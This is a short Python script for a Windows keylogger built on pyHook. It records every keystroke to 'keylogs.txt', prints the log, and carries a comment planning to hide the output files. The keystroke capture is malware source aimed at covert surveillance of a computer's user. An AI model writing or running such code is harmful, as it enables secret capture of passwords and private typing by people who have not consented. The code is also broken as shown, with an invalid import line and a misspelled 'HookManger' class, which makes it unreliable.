import pythoncom, import pyHook

# Define KeyPress Event
def keypressed(event):
    global store
#     Confirm extra keys will be shown to make the output readable
    if event.Ascii == 13:
        keys = ' < ENTER >'
    elif event.Ascii == 8:
        keys = ' < BACK SPACE > '
    else:
        keys = chr(event.Ascii)

    store = store + keys
# TODO: Write to hidden files
    fp = open("keylogs.txt", "w")
    fp.write(store)
    print(store)
    fp.close()

    return True

# Confirm event to create keypress event
store = ''
obj = pyHook.HookManger()
obj.KeyDown = keypressed

# 
obj.HookKeyboard()
pythoncom.PumpMessages()
